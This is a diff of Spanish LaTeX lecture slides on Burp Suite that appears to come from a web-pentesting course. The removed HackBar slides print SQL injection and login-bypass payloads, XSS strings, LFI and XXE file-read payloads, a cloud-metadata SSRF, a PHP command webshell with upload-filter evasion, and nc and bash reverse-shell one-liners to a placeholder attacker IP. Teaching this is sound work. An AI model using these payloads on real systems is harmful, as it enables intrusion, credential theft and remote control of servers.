+Burp es un Proxy web
   \begin{itemize}
   \item ¿Para qué un proxy web?
   \item Para muchos ataques y escaneos es útil tener control de bajo nivel sobre las peticiones a la web.
   \item Un proxy web se sitúa entre el navegador y el servidor: intercepta, modifica y elimina peticiones, entre otras acciones.
-  \item Burp Suite $\cdot$ OWASP ZAP
-  \item Vulnerabilidades Web
+  \item Los dos más famosos / comunes son: Burp Suite $\cdot$ OWASP ZAP
   \end{itemize}
 \end{frame}
 
-\begin{frame}[allowframebreaks]{Evaluación Continua}
-\small
-  \begin{itemize}
-  \item Puedes hacer esta room de tryhackme sobre BurpSuite y sus opciones:
-    \begin{itemize}
-    \item \href{https://tryhackme.com/r/room/burpsuiterepeater}{https://tryhackme.com/r/room/burpsuiterepeater}
-    \end{itemize}
-  \item Lecturas:
-    \begin{itemize}
-    \item \href{https://www.hackingarticles.in/burp-suite-for-pentester-configuring-proxy/}{https://www.hackingarticles.in/burp-suite-for-pentester-configuring-proxy/}
-    \item \href{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-1/}{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-1/}
-    \item \href{https://www.hackingarticles.in/burpsuite-for-pentester-fuzzing-with-intruder-part-2/}{https://www.hackingarticles.in/burpsuite-for-pentester-fuzzing-with-intruder-part-2/}
-    \item \href{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-3/}{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-3/}
-    \end{itemize}
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl039_1.jpg}
-\end{center}
-\end{frame}
 
 \begin{frame}[allowframebreaks]{Configuración avanzada de Burp Suite}
 \small
@@ -664,247 +609,24 @@
 \end{center}
 \end{frame}
 
-\section{HackBar}
 
-\begin{frame}[allowframebreaks]{HackBar --- Extensión de Burp Suite}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item ¿Qué es HackBar?
-  \item Extensión de Burp Suite que acelera la inserción de payloads
-  \item para las vulnerabilidades web más comunes. Evita errores de
-  \item escritura manual y permite explotar desde el Repeater con
-  \item un clic derecho $\rightarrow$ Hackbar $\rightarrow$ seleccionar payload.
-  \item Instalación
-  \item 1. Burp Suite $\rightarrow$ Extensions $\rightarrow$ BApp Store
-  \item 2. Buscar 'HackBar' $\rightarrow$ Install
-  \item --- O bien: descargar el .jar y añadirlo manualmente
-  \item 3. Extensions $\rightarrow$ Add $\rightarrow$ Type: Java $\rightarrow$ seleccionar el .jar
-  \item 4. Verificar en Repeater: clic derecho $\rightarrow$ debe aparecer 'Hackbar'
-  \item Vulnerabilidades cubiertas
-  \item SQL Injection (ORDER BY, UNION, Login Bypass)
-  \item Cross-Site Scripting (XSS)
-  \item Local File Inclusion (LFI) --- Linux y Windows
-  \item XXE Injection
-  \item File Upload (webshell PHP)
-  \item OS Command Injection + Reverse Shells
-  \item BApp Store: portswigger.net/bappstore
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl052_1.png}
+\begin{frame}{Ejercicio}
+\begin{center}\includegraphics[width=\textwidth,height=0.45\textheight,keepaspectratio]{img/sl039_1.jpg}
 \end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- SQL Injection: ORDER BY y UNION}
-\small
+\footnotesize
   \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item Flujo de trabajo con HackBar
-  \item 1. Interceptar petición $\rightarrow$ Send to Repeater (Ctrl+R)
-  \item 2. Clic derecho en el parámetro inyectable
-  \item 3. Hackbar $\rightarrow$ SQL Injection $\rightarrow$ elegir técnica
-  \item Determinar número de columnas
-  \item Hackbar $\rightarrow$ SQL Injection $\rightarrow$ Column Count $\rightarrow$ Order By
-  \item $\rightarrow$ Prueba ORDER BY 1, 2, 3... hasta que se produzca error
-  \item $\rightarrow$ Error en ORDER BY 4 $\rightarrow$ la tabla tiene 3 columnas
-  \item UNION-Based: extraer datos
-  \item Reemplazar id=1 por id=-1 (evitar datos reales)
-  \item Hackbar $\rightarrow$ SQL Injection $\rightarrow$ Union Based $\rightarrow$ No. of Columns: 3
-  \item $\rightarrow$ Genera: -1 UNION SELECT 1,2,3 --
-  \item $\rightarrow$ Los números visibles en respuesta = campos inyectables
-  \item Extraer información de la BD
-  \item Sustituir número visible por función:
-  \item -1 UNION SELECT 1,database(),version() --
-  \item -1 UNION SELECT 1,user(),@@datadir --
-  \item -1 UNION SELECT 1,schema\_name,3 FROM information\_schema.schemata --
-  \item Fuente: BurpSuite.pdf --- Sección SQL Injection
+  \item Puedes hacer esta room de tryhackme sobre BurpSuite y sus opciones:
+    \begin{itemize}
+    \item \href{https://tryhackme.com/r/room/burpsuiterepeater}{https://tryhackme.com/r/room/burpsuiterepeater}
+    \end{itemize}
+  \item Lecturas:
+    \begin{itemize}
+    \item \href{https://www.hackingarticles.in/burp-suite-for-pentester-configuring-proxy/}{https://www.hackingarticles.in/burp-suite-for-pentester-configuring-proxy/}
+    \item \href{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-1/}{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-1/}
+    \item \href{https://www.hackingarticles.in/burpsuite-for-pentester-fuzzing-with-intruder-part-2/}{https://www.hackingarticles.in/burpsuite-for-pentester-fuzzing-with-intruder-part-2/}
+    \item \href{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-3/}{https://www.hackingarticles.in/burp-suite-for-pentester-fuzzing-with-intruder-part-3/}
+    \end{itemize}
   \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl053_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- SQLi Login Bypass}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item Login Bypass con HackBar
-  \item HackBar incluye diccionarios predefinidos de payloads
-  \item de bypass de autenticación SQL listos para inyectar.
-  \item Procedimiento
-  \item 1. Interceptar el formulario de login (POST /login)
-  \item 2. Send to Repeater $\rightarrow$ localizar parámetros uname y pass
-  \item 3. Seleccionar los parámetros $\rightarrow$ clic derecho:
-  \item Hackbar $\rightarrow$ SQLi Login Bypass $\rightarrow$ Set 1 $\rightarrow$ 'or''='
-  \item 4. Enviar con Send $\rightarrow$ analizar la respuesta
-  \item $\rightarrow$ Si la respuesta muestra dashboard/panel: bypass exitoso
-  \item Payloads equivalentes manuales
-  \item admin'--
-  \item ' OR '1'='1
-  \item ' OR 1=1--
-  \item ' OR ''='
-  \item admin'/*
-  \item Sets adicionales en HackBar
-  \item Si el Set 1 no funciona, probar Set 2, Set 3...
-  \item Cada set contiene payloads con diferente sintaxis para
-  \item evadir distintos tipos de validación o filtros.
-  \item Si ningún set funciona: el campo puede usar prepared statements
-  \item Fuente: BurpSuite.pdf --- Sección SQLi Login Bypass
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl054_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- Cross-Site Scripting (XSS)}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item XSS con HackBar
-  \item HackBar incluye payloads XSS básicos y avanzados,
-  \item evitando errores de escritura de caracteres especiales.
-  \item Procedimiento
-  \item 1. Interceptar petición con el parámetro de búsqueda/input
-  \item 2. Send to Repeater
-  \item 3. Seleccionar el punto de inyección $\rightarrow$ clic derecho:
-  \item Hackbar $\rightarrow$ XSS $\rightarrow$ Basic $\rightarrow$ \textless{}script\textgreater{}alert('XSS')\textless{}/script\textgreater{}
-  \item 4. Send $\rightarrow$ revisar la respuesta HTML
-  \item $\rightarrow$ Si \textless{}script\textgreater{}alert('XSS')\textless{}/script\textgreater{} aparece sin escapar: vulnerable
-  \item 5. Usar 'Show Response in Browser' para confirmar el popup
-  \item Payloads adicionales en HackBar
-  \item XSS $\rightarrow$ Basic $\rightarrow$ diferentes variantes de \textless{}script\textgreater{}
-  \item XSS $\rightarrow$ Attribute $\rightarrow$ para inyectar en atributos HTML
-  \item XSS $\rightarrow$ Event handlers $\rightarrow$ onmouseover, onerror, onload...
-  \item XSS $\rightarrow$ Bypass $\rightarrow$ técnicas de evasión de filtros
-  \item Confirmar en el navegador
-  \item Burp Proxy $\rightarrow$ clic derecho $\rightarrow$ Show Response in Browser
-  \item $\rightarrow$ Pegar la URL generada en el navegador
-  \item $\rightarrow$ Si aparece el popup: XSS stored/reflected confirmado
-  \item Fuente: BurpSuite.pdf --- Sección Cross-Site Scripting
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl055_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- Local File Inclusion (LFI)}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item LFI con HackBar
-  \item HackBar incluye payloads para Linux, Windows y Path Traversal.
-  \item Procedimiento
-  \item 1. Identificar parámetro de inclusión de fichero:
-  \item ?page=home, ?file=index.php, ?include=about
-  \item 2. Interceptar la petición $\rightarrow$ Send to Repeater
-  \item 3. Seleccionar el valor del parámetro $\rightarrow$ clic derecho:
-  \item Hackbar $\rightarrow$ LFI $\rightarrow$ Simple Check $\rightarrow$ /etc/passwd
-  \item 4. Send $\rightarrow$ verificar si aparece el contenido del fichero
-  \item Payloads disponibles en HackBar
-  \item Linux:
-  \item /etc/passwd
-  \item /etc/shadow (requiere root)
-  \item /etc/hosts
-  \item /proc/self/environ
-  \item Windows:
-  \item C:/Windows/System32/drivers/etc/hosts
-  \item C:/boot.ini
-  \item Path Traversal:
-  \item ../../../../etc/passwd
-  \item ..\%2F..\%2F..\%2Fetc\%2Fpasswd (URL encoded)
-  \item php://filter/convert.base64-encode/resource=/etc/passwd
-  \item Fuente: BurpSuite.pdf --- Sección Local File Inclusion
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl056_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- XXE Injection}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item XXE con HackBar
-  \item HackBar genera automáticamente los payloads XML con
-  \item la definición de entidad externa y la referencia.
-  \item Procedimiento
-  \item 1. Identificar endpoint que procesa XML
-  \item (Content-Type: text/xml o application/xml)
-  \item 2. Interceptar la petición $\rightarrow$ Send to Repeater
-  \item 3. Clic derecho en el cuerpo XML $\rightarrow$ Hackbar $\rightarrow$ XXE $\rightarrow$ Select
-  \item $\rightarrow$ HackBar inserta automáticamente:
-  \item \textless{}!DOCTYPE foo [\textless{}!ENTITY file SYSTEM \textquotedbl{}file:///etc/passwd\textquotedbl{}\textgreater{}]\textgreater{}
-  \item 4. Sustituir el valor original por \&file; en el XML
-  \item 5. Send $\rightarrow$ el contenido del fichero aparece en la respuesta
-  \item Variantes de payload XXE
-  \item Lectura de fichero local: file:///etc/passwd
-  \item SSRF via XXE: http://169.254.169.254/latest/meta-data/
-  \item Error-based XXE: forzar error con entidad recursiva
-  \item Blind XXE: exfiltración por DNS/HTTP (OOB)
-  \item Tip: cambiar Content-Type
-  \item Si el endpoint no acepta XML, probar cambiar el Content-Type
-  \item de application/json a application/xml e inyectar el XXE.
-  \item Fuente: BurpSuite.pdf --- Sección XXE Injection
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl057_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- File Upload y Webshell PHP}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item Generar una Webshell con HackBar
-  \item HackBar puede generar webshells PHP para incluir en ficheros subidos.
-  \item Procedimiento
-  \item 1. En Burp Repeater $\rightarrow$ clic derecho en zona vacía:
-  \item Hackbar $\rightarrow$ File Upload $\rightarrow$ PHP Webshell $\rightarrow$ copiar el código generado
-  \item 2. Pegar en un fichero .php $\rightarrow$ guardar como webshell.php
-  \item 3. Subir el fichero via el formulario de upload vulnerable
-  \item 4. Descubrir la ruta de subida (gobuster, ffuf, código fuente)
-  \item 5. Acceder: http://victima.com/uploads/webshell.php?cmd=id
-  \item Webshell básica (generada por HackBar)
-  \item \textless{}?php echo system(\$\_GET[\textquotedbl{}cmd\textquotedbl{}]); ?\textgreater{}
-  \item ?cmd=id $\rightarrow$ usuario del servidor web
-  \item ?cmd=cat /etc/passwd $\rightarrow$ usuarios del sistema
-  \item ?cmd=ls /var/www/ $\rightarrow$ listar directorio web
-  \item Evasión de filtros de extensión
-  \item Cambiar .php $\rightarrow$ .php5, .phtml, .phar, .php7
-  \item Content-Type: cambiar a image/jpeg manteniendo el código PHP
-  \item Doble extensión: webshell.jpg.php (si solo valida inicio)
-  \item Null byte: webshell.php\%00.jpg (en PHP antiguo)
-  \item Para reverse shell: usar el módulo OS Command Injection de HackBar
-  \item Fuente: BurpSuite.pdf --- Sección Unrestricted File Upload
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl058_1.png}
-\end{center}
-\end{frame}
-
-\begin{frame}[allowframebreaks]{HackBar --- OS Command Injection y Reverse Shell}
-\small
-  \begin{itemize}
-  \item Herramientas / Burp Suite
-  \item Command Injection con HackBar
-  \item HackBar incluye payloads de inyección de comandos OS y generadores
-  \item de reverse shell de un solo comando (one-liners).
-  \item Procedimiento --- Reverse Shell
-  \item 1. Identificar parámetro vulnerable a command injection:
-  \item ?host=google.com $\rightarrow$ el servidor hace ping a ese host
-  \item 2. Interceptar $\rightarrow$ Send to Repeater
-  \item 3. Seleccionar el valor $\rightarrow$ clic derecho:
-  \item Hackbar $\rightarrow$ Reverse shell $\rightarrow$ One Liner $\rightarrow$ nc
-  \item 4. Añadir metacarácter separador antes del payload:
-  \item ; o | o \&\& o \%0a (newline URL-encoded)
-  \item 5. Introducir RHOST (IP de Kali) $\rightarrow$ OK
-  \item 6. Poner Kali en escucha: nc -lvnp 4444
-  \item 7. Send $\rightarrow$ la conexión reversa llega a Kali
-  \item One-liners disponibles en HackBar
-  \item nc (netcat): ;nc -e /bin/bash KALI\_IP 4444
-  \item bash: ;bash -i \textgreater{}\& /dev/tcp/KALI\_IP/4444 0\textgreater{}\&1
-  \item python: ;python3 -c 'import socket...'
-  \item perl: ;perl -e 'use Socket...'
-  \item Verificar la shell obtenida
-  \item id, whoami, hostname
-  \item python3 -c 'import pty;pty.spawn(\textquotedbl{}/bin/bash\textquotedbl{})' $\rightarrow$ TTY completa
-  \item Fuente: BurpSuite.pdf --- Sección OS Command Injection
-  \end{itemize}
-\begin{center}\includegraphics[width=\textwidth,height=0.82\textheight,keepaspectratio]{img/sl059_1.png}
-\end{center}
 \end{frame}
 
 \section{Laboratorio}
